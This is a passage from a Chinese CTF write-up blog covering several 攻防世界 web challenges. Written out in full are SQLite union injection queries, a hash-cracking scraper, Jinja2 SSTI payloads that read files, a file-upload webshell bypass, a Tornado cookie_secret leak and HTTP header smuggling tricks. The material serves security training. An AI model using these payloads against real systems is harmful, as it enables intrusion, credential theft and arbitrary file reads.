name=&#x27;&quot;.$user.&quot;&#x27; and password=&#x27;&quot;.sha1($pass.&quot;Salz!&quot;).&quot;&#x27;&quot;);    if($res)&#123;        $row = $res-&gt;fetchArray();    &#125;    else&#123;        echo &quot;&lt;br&gt;Some Error occourred!&quot;;    &#125;    if(isset($row[&#x27;id&#x27;]))&#123;            setcookie(&#x27;name&#x27;,&#x27; &#x27;.$row[&#x27;name&#x27;], time() + 60, &#x27;/&#x27;);            header(&quot;Location: /&quot;);            die();    &#125;&#125;if(isset($_GET[&#x27;debug&#x27;]))highlight_file(&#x27;login.php&#x27;);?&gt;\nSQLLite3\n根据报错SQLLite3找到对应的查询数据库的代码\nCppSQLite3Queryquery = db.execQuery(&quot;select * fromtarget_table&quot;);    while(!query.eof())    &#123;        cout&lt;&lt;&quot;name:&quot;&lt;&lt;query.getStringField(&quot;name&quot;)&lt;&lt;&quot;age : &quot;&lt;&lt;query.getIntField(&quot;age&quot;)&lt;&lt;endl;        query.nextRow();    &#125;    query.finalize();\nCppSQLite3Query是一个查询返回对象，查询完后可以利用此类。这里就使用CppSQLite3DB的一个函数\nexecQuery，只要将查询sql传入即可。\neof函数：判断是否还有数据；\nnextRow函数：移到下一条记录；\ngetStringField函数：获得相应字段的内容，以字符串形式返回；\ngetIntField函数：获得相应字段的内容，以整形形式返回。\n结合上述源代码：\n找到关键代码SQL语句：\n&quot;SELECT id,name from Users where name='&quot;.$user.&quot;' and password='&quot;.sha1($pass.&quot;Salz!&quot;).&quot;'&quot;\n\n通过SQL语句注入构建我们设计出如下查询的SQL语句：\n' union select  name,sql  from sqlite_master--\n\n至于为何是该语句：\nSQLite数据库中存在一个sqlite_master默认表，类似于mysql中的information_schema，可以在sqlite_master中查看所有的表名，以及之前执行过的建表语句，详细内容如下：\nsqlite_master ---- SQLite的系统表。该表记录数据库中保存的表，索引，视图和触发器信息。在创建sqlite数据库时该表会自动创建，sqlite_master表包含5个字段：\n    type ---- 记录该项目的类型，如：table、index、view、trigger\n    name ---- 记录该项目的名称，如：表名、索引名等\n    tbl_name ---- 记录所从属的表名，如索引所在的表名。对于表来说该列就是表名本身。\n    rootpage ---- 记录项目在数据库页中存储的编号。对于试图和触发器该字段为0或者NULL\n    sql ---- 记录创建该项目的sql语句\n\nso，我们可以构造如下所示的sql语句\nselect tbl_name from sqlite_master ---- 查询所有的表名\nselect sql from sqlite_master ---- 查询执行过的sql语句\nselect sql from sqlite_master where type='table' and tbl_name='Users' ---- 查询创建Users表的sql语句\n首先查到表名，再通过创建表的sql语句查到表中的字段信息，应用如下\n\n表名：Users：1' union select 1, tbl_name from sqlite_master--+\nUsers表的字段：1' union select 1, sql from sqlite_master where type='table' and tbl_name='Users'--+\n\n+CREATE+TABLE+Users%28id+int+primary+key%2Cname+varchar%28255%29%2Cpassword+varchar%28255%29%2Chint+varchar%28255%29%29;url-decode:CREATE TABLE Users(id int primary key,name varchar(255),password varchar(255),hint varchar(255));\nUsers表有四个字段：id，name，password，hint，利用group_concat()分别查询name，password和hint字段。执行如下所示的命令\n1' union select 1,group_concat(name,&quot;++++&quot;) from Users --+\n1' union select 1,group_concat(password,&quot;++++&quot;) from Users --+\n1' union select 1,group_concat(hint,&quot;++++&quot;) from Users --+\n\n分别输出\n1.+admin%2B%2B%2B%2Bfritze%2B%2B%2B%2Bhansi;//解码得到: admin++++fritze++++hansi;2.+3fab54a50e770d830c0416df817567662a9dc85c%2B%2B%2B%2B54eae8935c90f467427f05e4ece82cf569f89507%2B%2B%2B%2B34b0bb7c304949f9ff2fc101eef0f048be10d3bd;//解码得到: 3fab54a50e770d830c0416df817567662a9dc85c++++54eae8935c90f467427f05e4ece82cf569f89507++++34b0bb7c304949f9ff2fc101eef0f048be10d3bd;3.+my+fav+word+in+my+fav+paper%3F%21%2B%2B%2B%2Bmy+love+is%E2%80%A6%3F%2B%2B%2B%2Bthe+password+is+password;//解码得到 my fav word in my fav paper?!++++my love isâ¦?++++the password is password; //第三个说明关键词在该作者的论文中\n综上所述，我们知道用户的密码是由用户输入的密码连接&quot;Salz!&quot;字符串后经过sha1加密后得到的，也就是说我们需要通过脚本去爬取该作者的论文内容，让其与该字符串连接后在经过sha1加密得到的字段与数据库查询到的admin所对应的字段相等，那就是我们要的password\n那考虑到我的水平，就做个脚本小子吧\nimport requestsfrom bs4 import BeautifulSoupimport osimport reimport hashlibfrom pdfminer.pdfparser import PDFParserfrom pdfminer.pdfdocument import PDFDocumentfrom pdfminer.pdfpage import PDFPagefrom pdfminer.pdfpage import PDFTextExtractionNotAllowedfrom pdfminer.pdfinterp import PDFResourceManagerfrom pdfminer.pdfinterp import PDFPageInterpreterfrom pdfminer.layout import *from pdfminer.converter import PDFPageAggregator# 将pdf转换为txt的函数def pdf2txt(path):    # 打开PDF文件    pdfFile = open(path, &#x27;rb&#x27;)    # 创建pdf文档分析器    parser = PDFParser(pdfFile)    # 创建PDF文档对象存储文档结构    document = PDFDocument(parser)    # 检查文件是否允许文本提取    if not document.is_extractable:        raise PDFTextExtractionNotAllowed    # 创建PDF资源管理器对象来存储共享资源    resource = PDFResourceManager()    # 设定参数进行分析    laparams = LAParams()    # 创建一个PDF设备对象    device = PDFPageAggregator(resource, laparams=laparams)    # 创建一个PDF解释器对象    interpreter = PDFPageInterpreter(resource,device)    # 创建存储转换结果的同名txt文件    fileName = str(path.split(&quot;.&quot;)[0])    newFileName = fileName + &quot;.txt&quot;    f = open(newFileName, &quot;w&quot;)    # 处理每一页    for page in PDFPage.create_pages(document):        interpreter.process_page(page)        # 接受该页面的LTPage对象        layout = device.get_result()        for x in layout:            if (isinstance(x, LTTextBoxHorizontal)):                # 写入txt文件                try:                    f.writelines(x.get_text() + &quot;\\n&quot;)                except:                    pass    f.close()# 下载所有pdf文件的函数def downloadpdf():    pdfUrl = []  # 存放所有pdf文件的连接    # 爬取所有的pdf文件的连接    urlList = [        &quot;http://220.249.52.134:44174/&quot;,        &quot;http://220.249.52.134:44174/1/index.html&quot;,        &quot;http://220.249.52.134:44174/1/2/index.html&quot;,        &quot;http://220.249.52.134:44174/1/2/4/index.html&quot;,        &quot;http://220.249.52.134:44174/1/2/5/index.html&quot;,        &quot;http://220.249.52.134:44174/1/3/index.html&quot;,        &quot;http://220.249.52.134:44174/1/3/6/index.html&quot;,        &quot;http://220.249.52.134:44174/1/3/7/index.html&quot;,        &quot;http://220.249.52.134:44174/1/3/7/8/index.html&quot;        ]    for each in urlList:        r = requests.get(url=each)        soup = BeautifulSoup(r.text, &#x27;lxml&#x27;)        result = soup.find_all(name=&quot;a&quot;, attrs=&#123;&quot;title&quot;:&quot;my very fav paper&quot;&#125;)        for tmp in result:            if tmp[&quot;href&quot;].endswith(&quot;.pdf&quot;):                pdfUrl.append(each.split(&quot;index.html&quot;)[0] + tmp[&quot;href&quot;])    # 使用curl -O 命令下载pdf文件    for each in pdfUrl:        os.system(&quot;curl -O &quot; + each)# 取hash值的函数def sha1(msg):    sha1 = hashlib.sha1()    sha1.update((msg + &quot;Salz!&quot;).encode(&quot;utf-8&quot;))    return sha1.hexdigest()# 破解密码的函数def getpassword():    passlist = &#123;        &quot;3fab54a50e770d830c0416df817567662a9dc85c&quot;:&quot;admin&quot;,        &quot;54eae8935c90f467427f05e4ece82cf569f89507&quot;:&quot;fritze&quot;,        &quot;34b0bb7c304949f9ff2fc101eef0f048be10d3bd&quot;:&quot;hansi&quot;    &#125;    for each in os.listdir(os.curdir):        # 取出txt文件        if each.endswith(&quot;.txt&quot;):            with open(each, &quot;r&quot;) as file:                a = file.read()                b = re.split(r&quot;[\\s\\,\\;\\.]+&quot;, a)  # 将单词分割出来                c = []                tmp = &quot;&quot;                judge = False                # 处理以-结尾的行，最终的结果保存在c中                for each in b:                    if each.endswith(&quot;-&quot;):                        tmp = each.split(&quot;-&quot;)[0]                        judge = True                    elif judge:                        c.append(tmp + each)                        judge = False                    else:                        c.append(each)                # 遍历c碰撞得到密码                for each in c:                    print(each)                    if sha1(each) in passlist:                        return &quot;----&quot; + passlist[sha1(each)] + &quot;&#x27;s password is &quot; + each + &quot;Salz!&quot; + &quot;----&quot;def main():    os.chdir(os.curdir + os.sep + &quot;pdfdir&quot;)  # 修改工作目录    downloadpdf()  # 下载pdf文件    # 将所有pdf文件转换成txt文件    for each in os.listdir(os.curdir):        pdf2txt(each)    # 遍历所有的txt文件得到密码    password = getpassword()    return passwordif __name__ == &quot;__main__&quot;:    print(main())\n这个脚本是可以走出来的，不过似乎是我却一直报错，随后又看了了几篇wp，发现这里竟然可以直接md5解密？？\n\nThinJerboaSalz!//很好办了，出去salz，就是密码了：ThinJerboa\n\n于是去了解了一番sha1与md5加密，我之前一直认为这两个加密是本质上的不同的，结果并不是。。。\n并且这种做法有一定风险，因为不一定能查到，这里我查到了：\n1、安全性不同SHA-1 的安全性比MD5高。相对MD5而言，SHA-1的安全性比较高一些，如果单纯使用MD5可能比较容易遭到撞库攻击。通过预先计算知道MD5的对应关系，存在数据库中，然后使用的时候反查。2、校验值的长度不同MD5校验位的长度是16个字节（128位）；SHA-1是20个字节（160位）；3、运行速度不同SHA-1 的运行速度比MD5慢。\n参考文章：\nwp参考一\nwp参考二\n","categories":["攻防世界"]},{"title":"攻防世界-Confusion1","url":"/2023/08/21/Confusion1/","content":"题目描述：\n某天，Bob说：PHP是最好的语言，但是Alice不赞同。所以Alice编写了这个网站证明。在她还没有写完的时候，我发现其存在问题。(请不要使用扫描器)\n题目解题：\n\n进入页面，源代码也没啥信息，看一下其他页面，页面都一样，查看源代码\n\n发现每个页面都有这两条注释信息，访问也没啥用，初步只能证明他用的python的某个框架\n然后我尝试在url后面加上49，发现该变量被解析了\n\n但当我进一步搜寻基类时，便出现了\n\n这里是过滤了class，mro，subclasses，base。那就可以字符串拼接，或者利用request\n随后回想到之前的源代码，显示\n&lt;!--Flag @ /opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt--&gt;&lt;!--Salt @ /opt/salt_b420e8cfb8862548e68459ae1d37a1d5.txt--&gt;\n那很好想，这个txt就是flag所在文件了，那我们就应该利用read函数，但read也被过滤\npayload1：\n&#123;&#123;&#x27;&#x27;[&quot;__c&quot;&quot;lass__&quot;][&quot;__mr&quot;&quot;o__&quot;][2][&quot;__subcl&quot;+&quot;asses__&quot;]()[40](&#x27;/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt&#x27;)[&quot;re&quot;&quot;ad&quot;]()&#125;&#125;\npayload2:\n&#123;&#123;&#x27;&#x27;[request.args.a][request.args.b][2][request.args.c]()[40](&#x27;/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt&#x27;)[request.args.d]()&#125;&#125;?&amp;a=__class__&amp;b=__mro__&amp;c=__subclasses__&amp;d=read\n\n参考文章：\nSSTI模板注入绕过（进阶篇）_yu22x的博客-CSDN博客_ssti绕过\nSSTI模板注入及绕过姿势(基于Python-Jinja2)_Y4tacker的博客-CSDN博客_ssti绕过\n","categories":["攻防世界"]},{"title":"攻防世界-bug","url":"/2023/08/23/bug/","content":"题目描述：\n无\n题目解题：\n\n打开题目依旧是登录页面，先测试弱口令，没反应，随后扫目录的同时看看是否为sql，但很明显也不是，于是随便注册了一个用户，用来抓包看看是否存在逻辑漏洞\n\ncookie解密更改\n这里一看uid之类的，就感觉是逻辑漏洞了，不过我还是借鉴了wp，随后他说这个cookie中的user像是md5加密，于是乎我解密一番看看\n试了很多网站都解密不成功，看来只能靠猜，这里幸运的话猜到是有&quot;UID:用户名&quot;加密而成\n\n幸运的话在这里对&quot;1:admin&quot;进行加密修改cookie就可以直接看到admin用户的信息，随后就可以重置密码，不过这条路不太好走，换一条简单的\n重置密码的越权\n\n我们将我们注册过的用户输入进去进行密码重置看能否实现越权，在这里尝试的原因在于，别处的功能点均不存在越权漏洞。\n修改密码后bp抓包\n\n\n在这里修改为admin，admin看看\n\n发现成功了，那我们登录一下看看\n\n登录进去后，发现点击manage显示ip错误，无权访问，那估计就是修改xff或者ssrf了，那我们抓包看看\n\n发现有效果，看一下源码\n\n发现module的值为文件管理，如果是佬的话凭直觉认为是文件上传，所以他们会将do赋值为upload，果然还真成功了\nwp是这样说的：\n成功绕过IP检测后，能看见侧着的笑脸和Where Is The Flag?的字样。在源码中隐藏了另一个信息index.php?module=filemanage&amp;do=???.文件类型的action通常都是upload，故访问index.php?module=filemanage&amp;do=upload页面，在新页面中能进行文件上传。\n\n随便上传一个php文件测试\n\n发现有过滤，那我们先更改后缀看看，这里用00截断看看\n\n发现成功，然后又说我们的文件类型不对，于是我改为上述图片的，发现依旧不行，那可能就是文件内容也有过滤，这里就看了wp的\n将文件内容修改为&lt;script language='php'&gt;&lt;/script&gt;，绕过&lt;?的限制\n\n以为成功了，结果非得将文件类型修改为png才可以\n怎么说，做了一次下来，有点实战的味道\n参考文章：\nwp参考一\nwp参考二\n一句话木马大全\n","categories":["攻防世界"]},{"title":"攻防世界-easy_web","url":"/2023/08/24/easy_web/","content":"题目描述：\neasy_web\n题目解题：\n\n打开后如下，dirsearch扫目录没啥效果，源代码也没用，之后看了看该项目的cms信息\n\n那基本可以是ssti了，不过尝试的时候过滤了{}，然后我就不知道如何入手了。。。只能跟着wp走：\n回归到首页发现\n字符规范器，是不是找一些特殊字符可以恢复成&#123;这种形式，就找一下跟&#123;类似的特殊符号试一下\n特殊字符网址：http://www.fhdq.net/\n\n可以替换成功\n︷︷config︸︸\n\n在测试过程中发现单引号也被过滤掉，＇这个符号可以转换出'\n︷︷().__class__.__bases__[0].__subclasses__()︸︸\n\n︷︷().__class__.__base__.__subclasses__()︸︸返回一大堆，有人可能不知道接下来要干什么，这里看了大佬的分析,深有感触，这里返回的子类，接下来要去访问具体某一个子类的init方法，这里为什么要访问init方法呢，因为访问到init方法之后，你可以知道这个类是否被重写了，如果没有重写，会返回objecs字样，如图\n类没有被重写，是继承的object类,这些类不具备open方法来操作文件，达不到我们目的，我们就是要通过open来读取flag文件，所以我们需要去一个一个看，找到重写的子类，来通过调用open方法读取文件，当然这么多子类不可能一个一个手动去试，于是写了脚本，这里去burp爆破也可，比较方便\nimport htmlimport reimport requests url = &#x27;http://61.147.171.105:55725&#x27;for i in range(1, 200):    data = &#123;        &#x27;str&#x27;: &#x27;︷︷().__class__.__base__.__subclasses__()[%d].__init__︸︸&#x27; % i,    &#125;    res = requests.post(url=url, data=data)    res_ = html.unescape(res.text)    print(res_)\n​\t\t这部分会看到所有的子类的init方法，接下来加个判断过滤一下就OK，我们接着注入，这里我们知道重写了init方法的子类后，通过.__globals__访问定义该类的模块的全局命名空间，\n​\t\t解释下什么叫全局命名空间，在 Python 中，每个模块都有一个全局命名空间，用于存储该模块中定义的全局变量和函数。当一个类被定义在一个模块中时，它也可以访问该模块的全局命名空间中的变量和函数。所以我们可以通过访问 globals 属性来获得该模块的全局命名空间中的所有对象，包括全局变量和函数。这些对象可以被读取和修改，接下来介绍  builtins 是 Python 中一个内置的模块对象，他在python解释器启动时， builtins 对象就会被创建并且自动添加到全局命名空间中，因此 builtins 可以在认可地方访问， builtins 模块包含了很多内置函数，其中就包括我们这提要用的open（），所以我们通过__globals__来访问 builtins 模块中的open函数来达到读取flag文件的目的，\nif &#x27;objects&#x27; not in res_:    print(i, res_)\n接下来给脚本加上这两行，就会输出重写init的子类并且加上序号，方便后续手动操作，当然脚本也可以\n\nok这里看到序号之后开始注入，这里选择75，当然所有输出的序号都可以用\n︷︷().__class__.__base__.__subclasses__()[75].__init__.__globals__.__builtins__︸︸\n会看到出现了很多内置函数，这里就有我们需要用的open（），接下来使用open访问flag文件读取就行了\n︷︷().__class__.__base__.__subclasses__()[75].__init__.__globals__.__builtins__[＇open＇](＇/flag＇).read()︸︸ \n这里需要注意，[]和()里面的符号是＇而不是单引号（被过滤），之后就读到flag了\n参考文章：\n深入理解SSTI. 攻防世界easy_web 附python脚本\n攻防世界–easy_web\n攻防世界easy_web\n","categories":["攻防世界"]},{"title":"攻防世界-easytornado","url":"/2023/08/18/easytornado/","content":"题目描述：\nTornado 框架\n题目解题：\n\n进入题目看到如上，一个个点击看看\n\n\n\n既然是hint，那这里就是提示了这里的含义应该是，将filename经过md5加密，再加上cookie最后在加密\n也就分析到这里了，后面没啥头绪，只是确定的是这估计是个ssti注入漏洞，看了wp发现\n我们要访问/fllllllllllllag文件，url中也要以GET方式提交了2个参数：filename=/fllllllllllllag&amp;filehash=\n62499926a4a274c1614cf899bf7816b0\n直接访问是会报错的：\nhttp://111.200.241.244:53713/file?filename=/fllllllllllllag\n\n但细细观察发现msg参数的内容与前端页面内容一致，那么可以猜测这时就是注入点，那我们尝试一下即可\n\n但这里缺报错了，有点蒙，那估计就和框架有关了，在看wp发现，还是结合提示，这里我们首先已经得知要访问的文件名，那么此时就要想法获得cooki_secret。\n查看tornado的官方文档\ncookie_secret在tornado框架中的tornado.web.RequestHandler和tornado.web.Application类中有使用到：\ntornado.web.RequestHandler（HTTP请求处理程序的基类）\nRequestHandler.get_secure_cookie( name , value=None , max_age_days=31 , min_version=None )\n如果验证通过，则返回给定的签名cookie，否则返回 None。\nRequestHandler.settings\n\nRequestHandler类的设置参数，它的别名self.application.settings。\ntornado.web.Application（组成 Web 应用程序的请求处理程序的集合）\ntornado.web.Application.settings：\n  传递给构造函数的其他关键字参数保存在settings字典中，并且通常在文档中称为“应用程序设置”。设置用于自定义 Tornado 的各个方面（尽管在某些情况下，通过覆盖 的子类中的方法可以实现更丰富的自定义RequestHandler）。一些应用程序还喜欢使用settings字典作为一种方式，使处理程序可以使用特定于应用程序的设置，而无需使用全局变量。\n  其中就包含了cookie_secret: 由RequestHandler.get_secure_cookie函数和set_secure_cookie函数用于对 cookie 进行签名。\n所以可以访问到cookie_secret的函数有：RequestHandler.get_secure_cookie、RequestHandler.settings、self.application.settings、\n访问\nhttp://61.147.171.105:60053/error?msg=&#123;&#123;RequestHandler.get_secure_cookie&#125;&#125;\n\n突然发现不能直接用类名调用函数去访问到它settings，必须要用实例化的对象调用函数去访问，而handler就是处理当前这个页面的HTTP请求的RequestHandler对象\n（另：在Tornado的前端页面模板中，Tornado提供了一些对象别名来快速访问对象，Handler对象指向的处理当前这个页面的RequestHandler对象。执行?msg=&#123;&#123;datetime&#125;&#125; 还可以访问到datetime模块）\n得到cookie_secret的值\n所以我们直接访问handler.get_secure_cookie、handler.settings、handler.application.settings、\nhttp://61.147.171.105:60053/error?msg=&#123;&#123;handler.get_secure_cookie&#125;&#125;\n\nget_secure_cookie函数还是被过滤了\nhttp://61.147.171.105:60053/error?msg=&#123;&#123;handler.settings&#125;&#125;\n\n成功找到\n计算md5值\n之后我们继续计算哈希值：md5(cookie_secret+md5(/fllllllllllllag))\n  注意filename=/fllllllllllllag&amp;filehash=md5(cookie_secret+md5(filename))中filename=/fllllllllllllag不是fllllllllllllag，少了个“/”得到的MD5值会会不一样的，前面的/flag.txt、/welcome.txt、/hints.txt文件MD5值也是32位的。\nMD5在线加密 地址：http://www.jsons.cn/md5/s/\n/fllllllllllllag经过32位小写MD5值加密：\n3bf9f6cf685a6dd8defadabfb41a03a1\n之后cookie_secret的值加上/fllllllllllllag经过32位小写MD5值：\nfaaa34dd-fbe3-4b1b-9e2e-8071918f97453bf9f6cf685a6dd8defadabfb41a03a1\n再经过一次32小写MD5值加密：\n8b82faf703302b0590f91499236c86fa\n\n得到flag\n参考文章：\nwp参考一\nwp参考二\n","categories":["攻防世界"]},{"title":"攻防世界-ez_curl","url":"/2023/08/23/ez_curl/","content":"题目描述：\n无\n题目解题：\n &lt;?phphighlight_file(__FILE__);$url = &#x27;http://back-end:3000/flag?&#x27;;$input = file_get_contents(&#x27;php://input&#x27;);$headers = (array)json_decode($input)-&gt;headers; //取出名为 headers 的属性值，并将其转换为数组for($i = 0; $i &lt; count($headers); $i++)&#123;    $offset = stripos($headers[$i], &#x27;:&#x27;);    //确定冒号首次出现的位置    $key = substr($headers[$i], 0, $offset);  //取出冒号之前的内容    $value = substr($headers[$i], $offset + 1);//取出冒号之后的内容    if(stripos($key, &#x27;admin&#x27;) &gt; -1 &amp;&amp; stripos($value, &#x27;true&#x27;) &gt; -1)&#123;        die(&#x27;try hard&#x27;);    &#125;&#125;$params = (array)json_decode($input)-&gt;params;  //同上///使用 http_build_query() 函数将解析出的 params 数组转换为查询字符串，并将其追加到 $url 后面。$url .= http_build_query($params);$url .= &#x27;&amp;admin=false&#x27;;$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url);curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);//此处为创建并初始化curl对话，配置相关选项curl_setopt($ch, CURLOPT_TIMEOUT_MS, 5000);curl_setopt($ch, CURLOPT_NOBODY, FALSE);$result = curl_exec($ch);//执行curl请求，并将返回的结果保存在变量中curl_close($ch);//关闭对话echo $result;try hard1\n这里先看一下题目给的附件\napp.js\nconst express = require(&#x27;express&#x27;);//导入了 express 模块，也就是一个Node.js web 框架const app = express();//创建 Express 应用实例const port = 3000;//定义端口和 flagconst flag = process.env.flag;//取出环境变量中的flag//使用 app.get() 方法定义了一个路由，该路由监听路径 /flag 的 GET 请求，当接收到这个请求时，会触发回调函数。app.get(&#x27;/flag&#x27;, (req, res) =&gt; &#123;    //如果query属性的admin参数其值不含false，且请求头中的admin字段的值为true则输入flag    if(!req.query.admin.includes(&#x27;false&#x27;) &amp;&amp; req.headers.admin.includes(&#x27;true&#x27;))&#123;        res.send(flag);    &#125;else&#123;        res.send(&#x27;try hard&#x27;);    &#125;&#125;);app.listen(&#123; port: port , host: &#x27;0.0.0.0&#x27;&#125;);//使用 app.listen() 方法启动服务器，监听指定的端口和主机\n审完也没啥思路，扫目录也没啥信息，思考了一会儿，只是感觉应该是抓包修改一下某些信息，令监听的服务器返回flag，所以借鉴wp吧\n先看一下php代码，有一个file_get_contents(‘php://input’)，这是一个文件包含，当Content-Type为application/x-www-form-urlencoded且提交方法是POST方法时，$_POST数据与php://input数据是一致的。\n然后会$headers = (array)json_decode($input)-&gt;headers把post过去的数据解码成数组，很明显post的内容就是http请求里的headers，写post数据的时候要写成json的形式。像这样：\n&#123;&quot;headers&quot;: [&quot;admin:true&quot;]&#125;\nexpress框架\nExpress是一个流行的Node.js Web框架，它提供了许多有用的功能来构建Web应用程序。其中之一是参数解析，它允许开发者解析HTTP请求中的参数。Express提供了许多选项来配置参数解析。其中之一是parameterLimit选项。\nparameterLimit选项用于指定query string或者request payload的最大数量。默认情况下，它的值是1000。如果你的应用程序需要解析大量的查询字符串或者请求负载，你可能需要增加这个限制。例如，如果你的应用程序需要处理非常长的查询字符串，你可以将parameterLimit设置为一个更高的值。\n以下是一个示例，演示如何使用parameterLimit选项来增加query string和request payload的限制：\nconst express = require('express')\nconst app = express()\n\n// 将parameterLimit设置为10000\napp.use(express.json(&#123; parameterLimit: 10000 &#125;))\napp.use(express.urlencoded(&#123; parameterLimit: 10000, extended: true &#125;))\n\n在上面的代码中，我们将parameterLimit设置为10000。这将允许我们解析更大的请求负载和查询字符串。\n需要注意的是，如果你将parameterLimit设置为一个非常高的值，可能会导致安全问题。攻击者可以发送恶意请求，包含大量参数，导致服务器崩溃。因此，你应该谨慎地设置参数限制，并确保你的应用程序具有有效的安全措施，以防止此类攻击。\n本体两个知识点分别是：\n1.express的parameterLimit默认为1000\n2.根据rfc，header字段可以通过在每一行前面至少加一个SP或HT来扩展到多行\n\n第一点：来自源代码的这一行。结合这篇文章的分析，当我们传入的参数超过1000个时，之后的参数会被舍弃掉。于是这里我们最开始发个&quot;admin&quot;:&quot;t&quot;设置好admin的值，加上999个没用的参数，把程序拼接的&amp;admin=false挤掉，即可绕过过滤。\n第二点：header 字段可以通过在每一行前面至少加一个SP 或 HT 来扩展到多行。以此绕过对 headers 的过滤，也就是：\n​\t\t要求headers里的admin字段包含’true’就行了，可以是’xtrue’，这里根据RFC 7230(HTTP/1.1协议的定义)的规定，规定了 field-name 是由一个或多个打印的 ASCII 字符组成，不包括分隔符，包括空格。因此，如果一个 field-name 的第一个字符是空格，那么这个 HTTP header 是非法的，应该被服务器或客户端忽略或拒绝，然而，Node.js 在处理这类情况时通常是宽容的。\n最终的post的内容：\n&#123;&quot;headers&quot;: [&quot;admin: x&quot;, &quot; true: y&quot;]&#125; //注意这里true前有个空格\n这样写可以绕过php代码中的die(“try hard”)\n该headers在nodejs解析的时候，会得到如下数据：\n&#123;  &quot;admin&quot;: &quot;x true y&quot;&#125;\n经nodejs解析后admin字段包含‘true’，满足条件。\npython脚本如下：\nimport requestsimport jsonfrom abc import ABCfrom flask.sessions import SecureCookieSessionInterfaceurl = &quot;http://61.147.171.105:58035/&quot;datas = &#123;&quot;headers&quot;: [&quot;xx:xx\\nadmin: true&quot;, &quot;Content-Type: application/json&quot;],         &quot;params&quot;: &#123;&quot;admin&quot;: &quot;true&quot;&#125;&#125;for i in range(1020):    datas[&quot;params&quot;][&quot;x&quot; + str(i)] = iheaders = &#123;    &quot;Content-Type&quot;: &quot;application/json&quot;&#125;json1 = json.dumps(datas)print(json1)resp = requests.post(url, headers=headers, data=json1)print(resp.content)\n\n总结：\n到这里对我这个菜鸡就有难度了，不借鉴wp根本不行，但是也应该主动出击，遇到这种看到了源码，应该仔细分析，比如一看那个js我没有想到，这是一个web框架express，或许知道了后可以多去了解了解有什么相关特性或者漏洞，有可能就有所思路，不至于一股脑的照搬。\n参考文章：\nwp参考一\nwp参考二\n","categories":["攻防世界"]},{"title":"攻防世界-ezbypass-cat","url":"/2023/08/22/ezbypass-cat/","content":"题目描述：\nezbypass-cat\n题目解题：\n\n打开是一个登录页面，依旧尝试弱口令，但没有效果，只清楚用户名一定有admin，且密码经过了加密，不能爆破，页面源代码也没啥信息，所以我就开始扫网站，随后发现了几处信息泄露：/user/login，/v2/api-docs等等。\n\n之后就不知道如何利用了，只是感觉是未授权访问漏洞，应该是想办法遍历到用户名与密码的一些数据吧。。。\n看了wp才发现，dirsearch会直接爆破flag.html。。。。。难道我的字典这么弱吗，奇怪。\n直接访问看看，发现网站会自动重定向，那我们只能抓包了，结果发现直接访问url/flag.html竟然不行，于是考虑一下目录穿越\n访问url/index.html/…/flag.html在抓包，参考了一些wp发现，以login开头的登录界面一般是白名单，故要以index.html开头\n\n","categories":["攻防世界"]},{"title":"攻防世界-ics-07","url":"/2023/08/24/ics-07/","content":"题目描述：\n工控云管理系统项目管理页面解析漏洞\n题目解题：\n\n熟悉的页面，我们还是点击测试，发现只有项目管理可以点击\n\n页面如图所示，这里左下角有个view-source，我们审一下源码\n&lt;?php    session_start();//创建新会话，或重用现有会话（cookie提交会话id时）if (!isset($_GET[page])) &#123;//检查是否请求此页面    show_source(__FILE__);//若存在请求，语法高亮本页面（show_source作用等同于highlight_file）    die();&#125;if (isset($_GET[page]) &amp;&amp; $_GET[page] != &#x27;index.php&#x27;) &#123;//如果请求页面，且请求链接不为index.php    include(&#x27;flag.php&#x27;);//解析此文件flag.php&#125;else &#123;    header(&#x27;Location: ?page=flag.php&#x27;);//重定向到flag.php&#125;?&gt;    &lt;form action=&quot;#&quot; method=&quot;get&quot;&gt;    page : &lt;input type=&quot;text&quot; name=&quot;page&quot; value=&quot;&quot;&gt;        id : &lt;input type=&quot;text&quot; name=&quot;id&quot; value=&quot;&quot;&gt;            &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot;&gt;            &lt;/form&gt;            &lt;br /&gt;            &lt;a href=&quot;index.phps&quot;&gt;view-source&lt;/a&gt;            &lt;?php            if ($_SESSION[&#x27;admin&#x27;]) &#123;//如果会话的变量是admin                $con = $_POST[&#x27;con&#x27;];                $file = $_POST[&#x27;file&#x27;];                $filename = &quot;backup/&quot;.$file;//文件存储于 backup/                //匹配文件名称，是否存在php3 php4 php5 php7、phtml、pht?                if(preg_match(&#x27;/.+\\.ph(p[3457]?|t|tml)$/i&#x27;, $filename))&#123;                    die(&quot;Bad file extension&quot;);                &#125;else&#123;                    chdir(&#x27;uploaded&#x27;);//将当前目录改为uploaded，更改文件存储位置为/uploaded/backup                    $f = fopen($filename, &#x27;w&#x27;);//以写入方式打开文件，内容输出至$f                    fwrite($f, $con); //将$con的内容写入$f                    fclose($f);                &#125;            &#125;?&gt;    &lt;?php//如果 id不为空 且 id的浮点值不为1 且id的最后一个字符为9    if (isset($_GET[id]) &amp;&amp; floatval($_GET[id]) !== &#x27;1&#x27; &amp;&amp; substr($_GET[id], -1) === &#x27;9&#x27;) &#123;        include &#x27;config.php&#x27;;        $id = mysql_real_escape_string($_GET[id]);//以转义字符的方式连接当前的id，传送mysql查询        $sql=&quot;select * from cetc007.user where id=&#x27;$id&#x27;&quot;;//从数据库里查询相应的id        $result = mysql_query($sql);        $result = mysql_fetch_object($result);//取出查询结果    &#125; else &#123;        $result = False;        die();    &#125;if(!$result)die(&quot;&lt;br &gt;something wae wrong ! &lt;br&gt;&quot;);if($result)&#123;    echo &quot;id: &quot;.$result-&gt;id.&quot;&lt;/br&gt;&quot;;    echo &quot;name:&quot;.$result-&gt;user.&quot;&lt;/br&gt;&quot;;    $_SESSION[&#x27;admin&#x27;] = True;//需要满足id查询的名称为admin&#125;?&gt;\n由$_SESSION[‘admin’] = True;可知，只有查询id时对应有结果，那就会设置admin的session对话，这是我们文件上传的突破点，那一般来说id应该就是1，此处你结合代码floatval($_GET[id]) !== '1'也能知道，既然对1有所限制，那我们应该就是要查询id=1的内容\nfloatval — 获取变量的浮点值\nfloat floatval( mixed $var)\n返回变量 var      的 float 数值。\nvar 可以是任何标量类型。你不能将      floatval() 用于数组或对象。\n&lt;?php$var = &#x27;122.34343The&#x27;;$float_value_of_var = floatval ($var);print $float_value_of_var; // 打印出 122.34343?&gt; 